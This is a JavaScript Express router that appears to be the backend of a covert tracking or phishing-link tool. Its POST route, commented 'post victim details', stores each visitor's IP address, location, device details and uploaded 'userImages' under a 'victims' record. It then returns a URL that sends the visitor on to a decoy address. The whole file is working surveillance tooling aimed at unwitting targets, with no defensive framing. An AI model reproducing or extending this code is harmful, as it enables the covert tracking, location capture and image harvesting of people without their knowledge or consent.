require("dotenv").config();
const express = require("express");
const requestIp = require("request-ip");
const { uniqueId } = require("../utils");
const DB = require("../database");

const router = express.Router();

router.get("/", (req, res) => {
  const { r_id, u_id } = req.query;
  if (!r_id || !u_id) {
    res.status(400).end();
    return;
  }

  const projects = DB.get("projects", u_id);

  if (!projects) {
    // user haven't created any project
    return res.status(400).end();
  }

  const project = projects.find((x) => x.project_id === r_id);

  if (!project) {
    // user haven't created this project
    return res.status(400).end();
  }

  res.render("redirect", {
    project,
  });
});

// post victim details
router.post("/", (req, res) => {
  // post to project id
  const { projectId, username, userImages, device, location } = req.body;

  if (!projectId || !username || !device || !location) {
    // project not created
    return res.json({ success: false });
  }

  const projects = DB.get("projects", username);
  if (!projects) {
    // project not created
    return res.json({ success: false });
  }

  const project = projects.find((x) => x.project_id === projectId);
  if (!project) {
    // project not created
    return res.json({ success: false });
  }

  const victims = DB.get("victims", projectId);
  const uid = uniqueId();
  const date = new Date().toISOString();

  const victim = {
    victim_id: uid,
    project_id: projectId,
    ip: requestIp.getClientIp(req),
    userImages: userImages ? userImages : "",
    location,
    device,
    date_created: date,
  };

  DB.set("victims", projectId, [...victims, victim]);

  return res.json({
    success: true,
    url: project.url, // redirect user to this address
  });
});

module.exports = router;
